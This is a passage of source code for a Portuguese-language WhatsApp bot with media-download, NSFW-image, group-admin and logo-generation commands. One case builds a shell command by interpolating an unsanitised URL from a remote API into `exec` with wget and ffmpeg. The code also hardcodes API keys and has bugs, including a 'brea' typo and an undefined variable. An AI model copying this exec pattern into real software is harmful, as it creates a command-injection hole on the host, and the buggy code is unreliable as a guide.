tomioka.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:tomioka, caption: 'Está ai'})

break  
case 'bugrow':
case 'tocarmc':    
enviar('*「 ❗ 」 Aguarde um pouco, a procura da sua música...*')
aramas = await yts(q);
aramat = aramas.all 
var mulaikah = aramat[0].url							
console.log(color('[YT PLAY MÚSICA]', 'magenta'), color(`PROCURANDO A MÚSICA NO YT`, 'yellow')) 
try {
yta(mulaikah)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-createSticker.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `
「  PLAY MUSIC  」
Título : ${title}
Tamanho : ${filesizeF}
Tipo : mp3
Link para download* : ${a.data}`)
const captions = `
「  PLAY MUSIC  」
Título : ${title}
Tamanho : ${filesizeF}
Tipo : mp3
Link para download : ${a.data}`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => enviar('error'))
})                
})
} catch (err) {
enviar(err)
}
break
case 'play8':
if (!isPremium) return enviar ('só premium')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
play1 = body.slice(5)
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=viniciusbot&q=${play1}`)
if (anu.error) return enviar(anu.error)
infomp3 = `*MUSICA ENCONTRADA!!!*\nTítulo : ${anu.result.title}\nurl : ${anu.result.source}\nlink para download: ${anu.result.url_audio}\nTamanho : ${anu.result.size}`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_audio)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: infomp3})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${anu.result.title}.mp3`, 'jpegThumbnail': await getBuffer(anu.result.thumb)}}}})
break
case 'tiktok':
if (!q) return enviar('link?')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
res = await TiktokDownloader(`${q}`).catch(e => {
enviar('erro')
})
sendMediaURL(from, `${res.result.nowatermark}`, {quoted: tomio, contextInfo: tome}) 
break
///////////===============CASE BOTAO BUSCA YT/MUSICA E AUDIO DOWNLOADER========////// módulos 
case 'facebook':
case 'facemp4':  
case 'fb':
if (!q) return enviar(mess.wrongFormat)
if(!isUrl(args[0]) && !args[0].includes('facebook')) return enviar(mess.error.Iv)
teks = args[0]
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
res = await fbDown(teks).catch(e => {
enviar(`${e}`)
})
a = res[0]
result = `「 Facebook Downloader 」

• Título: ${a.judul}
• Fonte : ${a.source}
• Tamanho : ${a.size}
• Qualidade : ${a.quality}
• Modelo : ${a.type}
• Nome do arquivo : ${a.judul}.${a.type}`
sendFileFromUrl(a.thumb, image, {caption: result, quoted: tomio, contextInfo: tome})
sendFileFromUrl(a.link, video, {mimetype: 'video/mp4',quoted: tomio, contextInfo: tome})
await limitAdd(sender)
break
case 'buscar':

if (!isPremium) return enviar ('só premium')

if (!q) return enviar('cade o nome?')

res = await yts(q)

let thumbInfo = ` 

*Youtube Download*

*Título :* ${res.all[0].title}

*Vídeo ID :* ${res.all[0].videoId}

*Carregado em:* ${res.all[0].ago}

*Visualizações :* ${res.all[0].views}

*Duração :* ${res.all[0].timestamp}

*Canal :* ${res.all[0].author.name}

*Canal de link:* ${res.all[0].author.url}



*Selecione a mídia a ser baixada*

`

buttons = [{buttonId:`${prefix}pl000 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]



imageMessage = (await tomioka.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage



buttonsMessage = {contentText: thumbInfo,footerText:'*_Selecione o tipo de arquivo abaixo_*',imageMessage,buttons,headerType:4}



prep = await tomioka.prepareMessageFromContent(from,{buttonsMessage},{})



tomioka.relayWAMessage(prep)

break
///////////===============CASE BOTAO BUSCA YT/MUSICA E AUDIO DOWNLOADER========//////
//abrir fechar grupo botao
case 'abfe':
gambar = fs.readFileSync('./me.jpg')
mhan = await tomioka.prepareMessage(from, gambar, MessageType.image, {quoted: msg, thumbnail: fs.readFileSync('./assets/botlogo.webp'), contextInfo: {"mentionedJid": [sender]}})
gbutsan = [
{buttonId: 'Abrir 🔓', buttonText: {displayText: 'Abrir 🔓'}, type: 1},
{buttonId: 'Fechar 🔐', buttonText: {displayText: 'Fechar 🔐'}, type: 1}]
gbuttonan = {
imageMessage: mhan.message.imageMessage,
contentText: `Olá @${sender.split("@")[0]} 😎`,
footerText: `©TioTomioka_`,
buttons: gbutsan,
headerType: 4
}
await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage)
break
//yt play lista
case 'ytplay':
if(!isGroup)return enviar('só grupo')
if(!q) return enviar('cade o nome ou o link?')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
datai = [];
try{
ysearch = await yts(q)
hdata = ysearch.all
}catch(e){
return enviar('erro')
}
num = 1
for(let i=0; i<hdata.length; i++){
datai.push({
"rows": [
{
rowId: `${prefix}MP3 `+ hdata[i].title,
title: `${prefix}MP3`,
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
},
{
rowId: `${prefix}MP4 `+ hdata[i].title,
title: `${prefix}MP4`,
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
}
], title: num})
num += 1
}
po = tomioka.prepareMessageFromContent(from, {
"listMessage":{
"title": "*YOUTUBE DOWNLOAD*",
"description": `Solicitado por: ${pushname}\n *Resultado da pesquisa: ${q}*\n*Baixe clicando no botão abaixo* `,
"buttonText": "Result",
"listType": "SINGLE_SELECT",
"sections": datai}}, {}) 
tomioka.relayWAMessage(po, {waitForAck: true, quoted: tomio, contextInfo: tome})
break
case 'MP4':
if (args.length === 0) return enviar(`Use assim : *${prefix + command}* _O título da música_`)  
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
aramas = await yts(q);
aramat = aramas.all 
mulaikah = aramat[0].url      
console.log(color('[YT PLAY VÍDEO]', 'magenta'), color(`PROCURANDO O VÍDEO NO YT`, 'yellow'))       
try {
ytv(mulaikah)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-createSticker.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*「 REPRODUZIR VÍDEOS 」*\n\n*Titulo* : ${title}\n*Extração* : MP3\n*Tamanho do arquivo* : ${filesizeF}\n*Link* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`)
const captions = `*「 REPRODUZIR VÍDEOS 」*\n\n*Titulo* : ${title}\n*Extração* : MP4\n*Tamanho* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => enviar('error'))
})                
})
} catch (err) {
enviar('erro')
}
break
case 'MP3':                   
if (args.length === 0) return enviar(`Use assim *${prefix + command}* _O título da música a ser pesquisada_`)
aramas = await yts(q);
aramat = aramas.all 
var mulaikah = aramat[0].url							
console.log(color('[YT PLAY MÚSICA]', 'magenta'), color(`PROCURANDO A MÚSICA NO YT`, 'yellow')) 
try {
yta(mulaikah)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-createSticker.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*「 TOCAR MÚSICA 」*\n\n*Titulo* : ${title}\n*Extração* : mp3\n*Tamanho do arquivo* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`)
const captions = `*「 TOCAR MÚSICA 」*\n\n*Titulo* : ${title}\n*Extração* : mp3\n*Tamanho* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => enviar('error'))
})                
})
} catch (err) {
enviar(err)
}
break

case 'addfoto':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar ('Você quem é o dono? ')
tomioka.sendMessage(from, addfoto(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'next':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (isGroup) return  enviar( 'NÃO PODE ESTAR EM GRUPO!!!!')
await enviar('Ache um companheiro >_<')
await enviar(`wa.me/${anug}`)
await enviar( `Par encontrado: 🐊\n*${prefix}next* — Encontre novos parceiros`)
break		    
case 'tedio':	
enviar('Não fique entediado eu estou aqui🥰')
break
case 'nsfwblowjob':
try {
if (!isNsfw) return enviar ('❌ *FALSO* ❌')
res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob`, {method: 'get'})
buffer = await getBuffer(res.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'Não faça ingredientes para o tio comum'})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('❌ *ERRO* ❌')
}
break                       
case 'testime':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
setTimeout( () => {
tomioka.sendMessage(from, 'O tempo acabou:v', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
tomioka.sendMessage(from, 'Mais 5 segundos', text) // ur cods
}, 5000) // 1000 = 1s,
setTimeout( () => {
tomioka.sendMessage(from, '10 segundos para ir', text) // ur cods
}, 0) // 1000 = 1s,
break
case 'timer':
if (args[1]=="segundo") {var timer = args[0]+"000"
} else if (args[1]=="minuto") {var timer = args[0]+"0000"
} else if (args[1]=="hora") {var timer = args[0]+"00000"
} else {return enviar ("*escolher:*\nsegundo\nminuto\nhora")}
setTimeout( () => {
enviar("O tempo acabou")
}, timer)
break
case 'delete':
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('marque a msg para apagar *seja um administrador!*')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Comando recebido, excluir mensagem :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
tomioka.deleteMessage(from, mentioned)
} else {
mentions(`Perintah di terima, hapus pesan : @${mentioned[0].split('@')[0]}`, mentioned, true)
tomioka.deleteMessage(from, mentioned)
}
brea
case 'nsfwneko':
try {
if (!isNsfw) return enviar ('❌ *FALSO* ❌')
res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko`, {method: 'get'})
buffer = await getBuffer(res.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'ni anjim'})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('❌ *ERRO* ❌')
}
break
case 'nsfwtrap':
try {
if (!isNsfw) return enviar ('❌ *FALSO* ❌')
res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap`, {method: 'get'})
buffer = await getBuffer(res.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'ni Anjim'})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('❌ *ERRO* ❌')
}
break
//DINHEIRO DO BOT

case 'dinhero':          

case 'dinheiro':       

case 'meudinhero':
if (!isUser) return enviar('usuario nao registrado')

const uangkau = checkATMuser(sender)
sayo = `*┏⊱ 「 🤑DINHEIRO🤑 」⊰━┓*\n┣⊱ *Nome* : ${pushname}\n┣⊱ *Número* : ${sender.split("@")[0]}\n┣⊱ *Dinhero* : ${uangkau}\n┗━━━━━━━━━━`
enviar(sayo)
break

case 'dardinhero': 
if (!isOwner) return enviar('só dono')
const recebidor = args[0].replace('@','')
const quantidade = args[1]
if (quantidade <= 1) return enviar(`Precisa dar no minímo 1 dinheiro`)
if (isNaN(quantidade)) return enviar(`[❗] USE ASSIM\n ${prefix + command} @556181496039 5`)
if (!recebidor) return enviar(`[❗] USE ASSIM\n ${prefix + command} @556181496039 5`)
const add = recebidor + '@s.whatsapp.net'
addKoinUser(add, 0)                                        
enviar(`${quantidade} de dinhero foi adicionado na conta de @${recebidor}`)
break
case 'animsgiss':

anp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzApi}`, {method: 'get'})
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break 
case 'setfoto':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
media = await tomioka.downloadAndSaveMediaMessage(msg)
await tomioka.updateProfilePicture (from, media)
enviar('Alterou com sucesso o ícone do Grupo')
break		
case 'tinyurl':
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/tinyurl?url=${body.slice(9)}&apikey=${TobzApi}`)
tinyurl = `${anu.result}`
enviar(tinyurl)

break 
case 'slide':
if (args.length < 1) return enviar ('*Textnya mana gan?*')
teks = `${body.slice(7)}`
atytyd = await getBuffer(`https://api.vhtear.com/slidingtext?text=${teks}&apikey=${VthearApi}`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
tomioka.sendMessage(from, atytyd, video, {quoted: msg})

break  
case 'spotify':
if (args.length == 0) return 
enviar(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
url = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=genbotkey&url=${url}`)
get_result = get_result.result
ini_txt = `Titulo : ${get_result.title}\n`
ini_txt += `Duração : ${get_result.duration}\n`
thumbnail = await getBuffer(get_result.thumbnail)
await tomioka.sendMessage(from, thumbnail, image, {quoted: msg, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await tomioka.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break 
case 'spotifyy':
if (args.length == 0) return 
enviar(`Exemplo: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
url = args[0]
get_result = await fetchJson(`https://api-gdr2.herokuapp.com/api/spotifyurl?url=${url}`)
get_result = get_result.result
ini_txt = `Titulo : ${get_result.title}\n`
ini_txt += `Duração : ${get_result.duration}\n`
thumbnail = await getBuffer(get_result.image)
await tomioka.sendMessage(from, image, image, {quoted: msg, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await tomioka.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break
//_LOGOS 
case 'greenhorror':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/greenhorror?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sciencefiction':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/sciencefiction?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'transformer':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/transformer?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'berry':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/berry?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'magmahot':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/magmahot?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dstone':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dstone?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dneonlight':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dneonlight?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'impressiveglitch':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/impressiveglitch?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'harrypotter':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HarryPotter?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'embossed':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/embossed?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'brokenglass':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Brokenglass?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'artpaper':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/artpaper?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dglossy':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dglossy?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'neondevilwings':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/neondevilwings?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dunderwater':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dunderwater?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'bearmascot':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/bearmascot?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'wonderfulgraffiti':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/wonderfulgraffiti?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'futuristicneon':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/futuristicneon?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'snow':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/snow?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'cloud':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/cloud?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'luxurygold':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/luxurygold?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dgradient':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dgradient?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'realisticcloud':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/realisticcloud?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sandsummer':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SandSummer?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sandwriting':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SandWriting?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sandengraved':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Sandengraved?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'summerysand':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/summerysand?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dglue':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
